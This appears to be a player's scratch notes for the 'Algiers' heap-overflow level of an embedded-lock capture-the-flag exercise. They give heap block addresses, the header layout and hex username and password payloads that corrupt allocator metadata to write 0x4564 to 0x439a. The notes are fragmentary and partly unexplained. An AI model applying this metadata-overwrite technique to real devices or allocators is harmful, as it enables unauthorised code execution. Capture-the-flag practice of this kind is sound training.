# algiers #

username @ 0x240e
username->prev = 0x2408
username->next = 0x240a
username->size = 0x240c

password @ 0x2424
password->prev = 0x241e
password->next = 0x2420
password->size = 0x2422

```
block header (6 bytes) {
      prev ptr ; 2 bytes
      next ptr ; 2 bytes
      {15 bits of size, 1 bit of free/used} ; 2 bytes
}
```

write 0x4564 to 0x439a
username
 0 1 2 3 4 5 6 7 8 9 a b c d e f10111213
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa98436445ffff
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa964300010445
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa60450e4e

1e241e240233aaaaaaaaaaaaaaaaaaaa1e2462450110


1236
4136
password
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb644530120101
